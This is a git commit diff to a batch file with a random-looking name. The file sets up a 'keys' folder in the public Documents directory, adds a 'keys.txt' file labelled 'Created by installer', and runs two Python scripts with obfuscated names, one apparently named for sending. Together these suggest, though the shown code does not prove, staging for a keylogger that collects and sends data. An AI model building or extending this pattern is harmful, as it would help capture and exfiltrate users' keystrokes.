cfd8f2dbff14eec44dbbdff888e5401a1ef9a246
Gelli08 <hgellert0@gmail.com>
2025-11-20 11:31:53 +0100

    Update vw2i45ibzfrun2.bat

--- vw2i45ibzfrun2.bat
+++ vw2i45ibzfrun2.bat
@@ -4,8 +4,14 @@
 set "TARGET=%PUBLIC%\Documents\keys"
 if not exist "%TARGET%" mkdir "%TARGET%"
 
+:: hozzon létre egy keys.txt filet, ha még nincs
+if not exist "%TARGET%\keys.txt" (
+    echo Created by installer > "%TARGET%\keys.txt"
+)
+
 python "%TARGET%\spwww743g7w.py"
 python "%TARGET%\fwsendbfgw.py"
 
 echo.
 pause
+
